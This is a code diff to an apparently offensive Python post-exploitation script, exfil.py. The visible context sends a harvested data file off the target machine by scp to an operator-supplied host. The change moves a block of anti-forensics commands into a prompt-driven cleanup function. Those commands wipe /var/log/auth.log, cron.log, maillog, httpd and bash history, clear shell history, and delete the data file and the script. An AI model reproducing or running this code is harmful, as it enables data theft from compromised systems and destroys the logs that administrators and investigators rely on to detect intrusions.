@@ -66,16 +66,6 @@ def extract_clear():
         # exfil the data file to local machine
         os.system(f"scp /tmp/data_exfil.txt root@{local_path}]")
         print(f"\n*** data_exfil.txt sent to {local_path} ***")
-
-        # delete logs and this script from target machine
-        print("\n### data exfiltrated... clearing log files ###")
-        os.system("echo ' ' > ~/.bash_history")
-        os.system("echo ' ' > /var/log/auth.log")
-        os.system("echo ' ' > /var/log/cron.log")
-        os.system("echo ' ' > /var/log/maillog")
-        os.system("echo ' ' > /var/log/httpd")
-        os.system("history -c")
-        os.system("history -w")
         exit()
     else:
         print("didn't write yes or no!!!")
@@ -95,14 +85,23 @@ def cred_info():
     else:
         cred_info()
 
-
+# ask to clear logs and delete script from local machine
 def delete_file():
-    print("\ndo you want to delete the data file and this script?")
+    print("\ndo you want to delete the logs and this script?")
     answer_2 = input("(yes/no): ")
     if answer_2 == "no":
         print("good luck!")
         exit()
     elif answer_2 == "yes":
+        # delete logs and this script from target machine
+        print("\n### clearing log files ###")
+        os.system("echo ' ' > /var/log/auth.log")
+        os.system("echo ' ' > /var/log/cron.log")
+        os.system("echo ' ' > /var/log/maillog")
+        os.system("echo ' ' > /var/log/httpd")
+        os.system("history -c")
+        os.system("history -w")
+        os.system("echo ' ' > ~/.bash_history")
         print("\n### deleting data file and script... ###")
         os.system("rm -rf /tmp/.data")
         os.system("rm exfil.py")
